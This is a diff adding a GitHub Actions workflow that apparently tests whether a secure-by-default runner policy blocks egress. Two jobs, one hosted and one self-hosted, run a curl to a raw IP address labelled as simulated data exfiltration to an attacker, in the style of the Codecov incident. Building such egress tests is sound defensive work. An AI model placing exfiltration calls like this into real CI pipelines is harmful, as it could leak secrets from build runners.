@@ -1,0 +1,22 @@
+name: 2. Secure-By-Default ARC Cluster-Level Policy
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  direct-ip-hosted:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      # Codecov Scenario: Exfiltrate data to attacker's IP address
+      - name: Data Exfiltration To Attacker Controlled IP address
+        run: curl 104.16.209.12 -L
+  direct-ip-arc:
+    runs-on: self-hosted
+    steps:
+      - uses: actions/checkout@v3
+
+      # Codecov Scenario: Exfiltrate data to attacker's IP address
+      - name: Data Exfiltration To Attacker Controlled IP address
+        run: curl 104.16.209.12 -L
